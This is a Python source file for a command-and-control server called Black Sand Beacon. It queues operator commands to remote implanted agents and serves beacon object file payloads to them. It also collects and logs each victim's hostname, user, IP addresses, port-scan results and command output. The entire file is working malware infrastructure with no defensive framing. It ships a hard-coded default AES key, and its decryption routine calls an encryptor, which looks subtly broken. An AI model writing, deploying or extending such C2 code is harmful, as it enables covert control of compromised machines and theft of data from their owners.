#!/usr/bin/env python3
"""
Black Sand Beacon C2 Server

Gopher-style command and control server for Black Sand Beacon agents.
Handles command queuing, result collection, and BOF distribution.

Security features:
- Thread pool to prevent resource exhaustion
- HMAC-based message authentication (optional)
- Configurable TLS verification
- Centralized JSON configuration

Usage:
    python3 c2/server.py
    BSB_CONFIG=/path/to/config.json python3 c2/server.py
"""
import base64
import csv
import hashlib
import hmac
import json
import logging
import os
import socket
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Optional, Dict, Any

# Add include/ to path for config loader
ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "include"))

try:
    from config_py import load_config
except ImportError:
    load_config = None

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Default configuration (overridden by config.json)
DEFAULTS = {
    "host": "0.0.0.0",
    "port": 7070,
    "uri": "/api/poll/",
    "report_uri": "/report/",
    "aes_key_hex": "0123456789abcdef" * 4,
    "log_dir": "sessions/logs",
    "upload_dir": "sessions/uploads",
    "max_workers": 10,
    "hmac_enabled": False,
}


def load_runtime_config() -> Dict[str, Any]:
    """Load configuration from JSON file or use defaults."""
    cfg_path = os.environ.get("BSB_CONFIG", str(ROOT / "config" / "config.json"))
    out = dict(DEFAULTS)

    if load_config is not None and os.path.isfile(cfg_path):
        try:
            data = load_config(cfg_path)
            out["uri"] = data.get("c2", {}).get("uri", out["uri"])
            out["report_uri"] = data.get("c2", {}).get("report_uri", out["report_uri"])
            out["aes_key_hex"] = data.get("crypto", {}).get("aes_key_hex", out["aes_key_hex"])
            out["log_dir"] = data.get("c2", {}).get("log_dir", out["log_dir"])
            out["upload_dir"] = data.get("c2", {}).get("upload_dir", out["upload_dir"])
            out["port"] = int(data.get("c2", {}).get("port", out["port"]))
            out["max_workers"] = int(data.get("server", {}).get("max_workers", out["max_workers"]))
            out["hmac_enabled"] = bool(data.get("crypto", {}).get("hmac_enabled", out["hmac_enabled"]))
        except Exception as e:
            logging.warning("config load failed: %s; using defaults", e)

    out["host"] = os.environ.get("BSB_C2_HOST", out["host"])
    port_env = os.environ.get("BSB_C2_PORT")
    out["port"] = int(port_env) if port_env else int(out["port"])
    out["aes_key"] = bytes.fromhex(out["aes_key_hex"])

    return out


def compute_hmac(key: bytes, data: bytes) -> str:
    """Compute HMAC-SHA256 for message authentication."""
    return hmac.new(key, data, hashlib.sha256).hexdigest()


def verify_hmac(key: bytes, data: bytes, signature: str) -> bool:
    """Verify HMAC-SHA256 signature."""
    expected = compute_hmac(key, data)
    return hmac.compare_digest(expected, signature)


def encrypt_data(data: bytes, key: bytes, use_hmac: bool = False) -> str:
    """Encrypt data with AES-256-CFB and optional HMAC."""
    if len(data) == 0:
        data = b"\x00"

    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(data) + encryptor.finalize()

    payload = iv + encrypted
    b64 = base64.b64encode(payload).decode()

    if use_hmac:
        signature = compute_hmac(key, payload)
        return f"{b64}:{signature}"

    return b64


def decrypt_data(b64_data: str, key: bytes, use_hmac: bool = False) -> Optional[bytes]:
    """Decrypt AES-256-CFB data with optional HMAC verification."""
    signature = None
    if use_hmac and ":" in b64_data:
        b64_data, signature = b64_data.rsplit(":", 1)

    raw = base64.b64decode(b64_data)

    if use_hmac and signature:
        if not verify_hmac(key, raw, signature):
            logging.error("HMAC verification failed")
            return None

    iv, ciphertext = raw[:16], raw[16:]
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.encryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()


class C2State:
    """Mutable state shared between request handlers."""

    def __init__(self, cfg: Dict[str, Any]):
        self.cfg = cfg
        self.commands: Dict[str, str] = {}
        self.connected_clients = set()
        self.results: Dict[str, Any] = {}
        self.lock = threading.Lock()

        os.makedirs(cfg["log_dir"], exist_ok=True)
        os.makedirs(cfg["upload_dir"], exist_ok=True)


def handle_get_command(state: C2State, selector: str) -> bytes:
    """Dispatch beacon's polling GET request."""
    prefix = state.cfg["uri"].rstrip("/") + "/"
    if not selector.startswith(prefix):
        return b"iUNKNOWN_SELECTOR\terror.host\t1\r\n.\r\n"

    client_id = selector[len(prefix):].strip() or "unknown"

    with state.lock:
        state.connected_clients.add(client_id)
        cmd = state.commands.pop(client_id, "")

    if cmd:
        print(f"[>] {client_id} <- {cmd!r}", flush=True)

    payload = encrypt_data(
        cmd.encode() if cmd else b"",
        state.cfg["aes_key"],
        state.cfg.get("hmac_enabled", False)
    )
    return payload.encode("ascii") + b"\r\n"


def handle_report(state: C2State, b64_payload: str) -> bytes:
    """Process beacon result report."""
    try:
        decrypted = decrypt_data(
            b64_payload,
            state.cfg["aes_key"],
            state.cfg.get("hmac_enabled", False)
        )
        if decrypted is None:
            return b"ERROR\r\n"

        data = json.loads(decrypted.decode())
    except Exception as e:
        logging.error("report decode error: %s", e)
        return b"ERROR\r\n"

    client_id = data.get("client", "unknown")

    with state.lock:
        state.connected_clients.add(client_id)
        log_file = os.path.join(state.cfg["log_dir"], f"{client_id}.log")
        new_file = not os.path.isfile(log_file)

        with open(log_file, "a", newline="") as f:
            writer = csv.writer(f)
            if new_file:
                writer.writerow([
                    "client_id", "os", "pid", "hostname", "ips", "user",
                    "discovered_ips", "result_portscan", "result_pwd",
                    "command", "output",
                ])
            writer.writerow([
                client_id,
                data.get("client", "")[:100],
                str(data.get("pid", ""))[:20],
                data.get("hostname", "")[:100],
                data.get("ips", "")[:100],
                data.get("user", "")[:50],
                str(data.get("discovered_ips", ""))[:1000],
                str(data.get("result_portscan", ""))[:1000],
                data.get("result_pwd", "")[:1000],
                data.get("command", "")[:500],
                data.get("output", "")[:1000],
            ])

        state.results[client_id] = data

    cmd = data.get("command", "")
    out = data.get("output", "")
    if len(out) > 200:
        out = out[:200].replace("\n", "\\n") + f"... (+{len(data.get('output',''))-200} chars)"
    print(f"[<] {client_id} -> {cmd!r}  (pid={data.get('pid','')})  out={out!r}", flush=True)

    return b"OK\r\n"


def handle_bof(state: C2State, name: str) -> bytes:
    """Serve BOF file from upload directory."""
    safe = os.path.basename(name)
    path = os.path.join(state.cfg["upload_dir"], safe)
    if os.path.isfile(path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read()) + b"\r\n"
    return b"BOF_NOT_FOUND\r\n"


def handle_request(state: C2State, selector: str) -> bytes:
    """Route request to appropriate handler."""
    selector = selector or ""

    # HTTP/1.1 request parsing
    head, _, rest = selector.partition("\r\n\r\n")
    if head and " " in head.split("\r\n", 1)[0]:
        request_line = head.split("\r\n", 1)[0]
        parts = request_line.split(" ", 2)
        if len(parts) == 3 and parts[2] in ("HTTP/1.0", "HTTP/1.1"):
            method, path, _ = parts
            path = path.split("?", 1)[0]

            if method == "GET" and path.startswith(state.cfg["uri"].rstrip("/") + "/"):
                return handle_get_command(state, path)
            if method == "POST" and path.startswith(state.cfg["report_uri"].rstrip("/") + "/"):
                payload = path[len(state.cfg["report_uri"].rstrip("/") + "/"):]
                return handle_report(state, payload)
            if method == "GET" and path.startswith("/bof/"):
                return handle_bof(state, path[len("/bof/"):])

    # Gopher-style selector (legacy)
    selector = selector.strip()
    if selector.startswith(state.cfg["uri"].rstrip("/") + "/"):
        return handle_get_command(state, selector)
    if selector.startswith(state.cfg["report_uri"].rstrip("/") + "/"):
        return handle_report(state, selector[len(state.cfg["report_uri"].rstrip("/") + "/"):])
    if selector.startswith("/bof/"):
        return handle_bof(state, selector[len("/bof/"):])

    return b"iUNKNOWN_SELECTOR\terror.host\t1\r\n.\r\n"


def serve_client(state: C2State, conn: socket.socket, addr: tuple):
    """Handle individual client connection."""
    try:
        conn.settimeout(5)
        data = b""
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
            if b"\r\n" in data or len(data) > 65536:
                break

        if data:
            response = handle_request(state, data.decode("latin-1"))
            conn.sendall(response)
    except Exception as e:
        logging.error("client handler error: %s", e)
    finally:
        conn.close()


def command_injector(state: C2State):
    """Interactive command injection REPL."""
    print("\nC2 Command Injector (Ctrl+D to exit)")
    print("=" * 50)

    while True:
        try:
            cid = input("Client ID: ").strip()
            if not cid:
                continue
            cmd = input("Command: ").strip()
            if not cmd:
                continue

            with state.lock:
                state.commands[cid] = cmd

            print(f"[+] Queued '{cmd}' for {cid}")
        except (EOFError, KeyboardInterrupt):
            print("\n[!] Exiting command injector")
            break


def main():
    """Start C2 server."""
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s"
    )

    cfg = load_runtime_config()
    state = C2State(cfg)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((cfg["host"], cfg["port"]))
    sock.listen(5)

    max_workers = cfg.get("max_workers", 10)
    executor = ThreadPoolExecutor(max_workers=max_workers)

    print(f"[*] Black Sand Beacon C2 Server")
    print(f"[*] Listening on {cfg['host']}:{cfg['port']}")
    print(f"[*] Thread pool: {max_workers} workers")
    print(f"[*] HMAC: {'enabled' if cfg.get('hmac_enabled') else 'disabled'}")
    print(f"[*] Log dir: {cfg['log_dir']}")
    print(f"[*] Upload dir: {cfg['upload_dir']}")

    # Start command injector in background thread
    injector_thread = threading.Thread(
        target=command_injector,
        args=(state,),
        daemon=True
    )
    injector_thread.start()

    try:
        while True:
            conn, addr = sock.accept()
            executor.submit(serve_client, state, conn, addr)
    except KeyboardInterrupt:
        print("\n[!] Shutting down C2 server")
    finally:
        sock.close()
        executor.shutdown(wait=False)


if __name__ == "__main__":
    main()
